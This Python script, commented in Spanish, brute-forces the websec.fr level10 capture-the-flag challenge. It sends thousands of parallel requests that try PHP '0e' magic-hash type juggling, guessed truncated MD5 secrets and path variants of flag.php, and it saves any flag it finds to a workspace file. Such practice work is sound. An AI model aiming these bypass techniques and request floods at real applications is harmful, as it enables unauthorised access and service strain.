#!/usr/bin/env python3
import requests
import concurrent.futures
import itertools
import hashlib
import string

url = "https://websec.fr/level10/index.php"

def test_hash(params):
    try:
        r = requests.get(url, params=params, timeout=2)
        if "WEBSEC{" in r.text:
            flag_start = r.text.find("WEBSEC{")
            flag_end = r.text.find("}", flag_start)
            if flag_end > flag_start:
                return r.text[flag_start:flag_end+1], params
    except:
        pass
    return None, None

# ESTRATEGIA 1: Probar hashes 0e con diferentes longitudes y formatos
print("ESTRATEGIA 1: Hashes 0e...")
hashes_0e = []
for i in range(10000):
    hashes_0e.append({"f": "flag.php", "hash": f"0e{i:06d}"})

# ESTRATEGIA 2: Probar strings cortos como flag con flag.php
print("ESTRATEGIA 2: Adivinar flag...")
test_flags = []
for length in range(1, 4):
    for combo in itertools.product(string.ascii_lowercase + string.digits, repeat=length):
        test_flag = ''.join(combo)
        h = hashlib.md5((test_flag + "flag.php" + test_flag).encode()).hexdigest()[:8]
        test_flags.append({"f": "flag.php", "hash": h})
        if len(test_flags) > 10000:
            break
    if len(test_flags) > 10000:
        break

# ESTRATEGIA 3: Paths alternativos con hash conocido
print("ESTRATEGIA 3: Paths alternativos...")
alt_paths = []
for prefix in ["", ".", "./", "../", "///", ".//", "././"]:
    for suffix in ["", "/", "//"]:
        path = f"{prefix}flag.php{suffix}"
        alt_paths.append({"f": path, "hash": "b4382d64"})
        alt_paths.append({"f": path, "hash": "0"})

# Combinar todas las estrategias
all_tests = hashes_0e + test_flags + alt_paths
print(f"\nTotal pruebas: {len(all_tests)}")
print("Ejecutando en paralelo...\n")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(test_hash, params): params for params in all_tests}
    
    for i, future in enumerate(concurrent.futures.as_completed(futures)):
        if i % 500 == 0:
            print(f"Progreso: {i}/{len(all_tests)}")
        
        flag, params = future.result()
        
        if flag:
            print(f"\n{'='*60}")
            print(f"¡¡¡FLAG ENCONTRADA!!!")
            print(f"{'='*60}")
            print(f"FLAG: {flag}")
            print(f"Params: {params}")
            
            with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                f.write(f"FLAG: {flag}\nParams: {params}\n")
            
            executor.shutdown(wait=False)
            break

print("\nBúsqueda completada.")